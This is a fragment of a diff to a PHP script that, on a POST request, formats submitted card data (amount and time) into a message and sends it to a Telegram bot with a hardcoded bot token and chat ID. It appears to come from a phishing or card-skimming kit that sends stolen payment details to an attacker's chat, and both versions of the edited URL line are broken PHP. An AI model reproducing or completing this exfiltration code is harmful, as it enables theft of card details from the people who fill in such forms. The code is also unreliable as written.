@@ -27,7 +27,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $message .= "💵 Amount: $" . $cardData['amount'] . "\n";
         $message .= "🕒 Time: " . date('Y-m-d H:i:s');
         
-        $url = "https://api.telegram.org/bot" . 8679202995:AAG8eQXbio2vL1Y6scvcKxWHSeBNoOmD3_s . "/sendMessage";
+        $url = "https://api.telegram.org/bot"8679202995:AAG8eQXbio2vL1Y6scvcKxWHSeBNoOmD3"/sendMessage";
         $data = [
             'chat_id' => 7133577749,
             'text' => $message,
